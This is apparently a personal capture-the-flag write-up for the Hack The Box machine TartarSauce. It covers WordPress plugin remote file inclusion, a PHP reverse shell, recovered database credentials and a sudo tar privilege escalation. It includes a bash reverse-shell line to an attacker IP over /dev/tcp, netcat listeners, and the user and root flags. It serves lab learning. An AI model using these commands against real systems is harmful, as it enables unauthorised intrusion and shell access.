Machine: https://app.hackthebox.com/machines/138
IP: 10.10.10.88

# Enumeration

Port 80:

/robots.txt (Rabbit holes)

```
User-agent: *
Disallow: /webservices/tar/tar/source/
Disallow: /webservices/monstra-3.0.4/
Disallow: /webservices/easy-file-uploader/
Disallow: /webservices/developmental/
Disallow: /webservices/phpmyadmin/
```

/webservices/monstra-3.0.4/robots.txt (Rabbit holes)

```
User-agent: *
Disallow: /admin/
Disallow: /engine/
Disallow: /libraries/
Disallow: /plugins/
```

/webservices/wp

`Wordpress website`

/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt

```
== Changelog ==

= 2.3.10 =
* 2018-2-12
* Changed version from 1.5.3 to 2.3.10 to trick wpscan ;D
```

https://0xdf.gitlab.io/2018/10/20/htb-tartarsauce.html

Vulnerable to RFI

# Exploitation

Attacker

`python3 -m http.server 80`

and curl to our machine

`curl -s http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.16.12/`

We see that it is trying to get wp-load.php

```bash
root@kali# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.88 - - [28/May/2018 15:10:22] "GET /wp-load.php HTTP/1.0" 404 -
```

Exploit:

Create wp-load.php file that contains reverse shell

wp-load.php:

PHP Reverse shell pentest monkey

Start a listener and curl again

`nc -lvnp 1234`

# Post-Exploitation

## Shell as `www-data`:

/var/www/html/webservices/wp/wp-config.php

```bash
/ ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wp');

/** MySQL database username */
define('DB_USER', 'wpuser');

/** MySQL database password */
define('DB_PASSWORD', 'w0rdpr3$$d@t@b@$3@cc3$$');
```

View local port

```bash
www-data@TartarSauce:/var/www/html/webservices/wp$ ss -lntp
State      Recv-Q Send-Q Local Address:Port               Peer Address:Port              
LISTEN     0      80     127.0.0.1:3306                     *:*
```

Query in mysql shell

```bash
wpadmin    | $P$BBU0yjydBz9THONExe2kPEsvtjStGe1 | wpadmin       | wpadmin@test.local |
```

```bash
User www-data may run the following commands on TartarSauce:
    (onuma) NOPASSWD: /bin/tar
```

Tar has this option where extracted file can be used to execute

`--to-command=COMMAND   pipe extracted files to another program`

Exploit:

```bash
echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.16.12/1234 0>&1' > a.sh

tar -cvf a.tar a.sh

sudo -u onuma tar -xvf a.tar --to-command /bin/bash
```

Start a listener to get shell

`nc -lnvp 1234`

## Shell as `onuma`:

user.txt 61581cbcd480d2e87fb9ae0772308f7b

Stabalize shell with python3

```
python3 -c 'import pty;pty.spawn("/bin/bash")'

ctrl+z

stty raw -echo;fg

enter

enter
```

https://0xdf.gitlab.io/2018/10/20/htb-tartarsauce.html

To exploit this script, I’ll take advantage of two things: the sleep, and the recursive diff. During the sleep, I’ll unpack the archive, replace one of the files with a link to /root/root.txt, and re-archive it. Then when the script opens the archive and runs the diff, the resulting file will be different, and the contents of both files will end up in the log file.

root.txt 929442365ff3876f94729e440c8a1217

# Beyond Root

https://0xdf.gitlab.io/2018/10/20/htb-tartarsauce.html

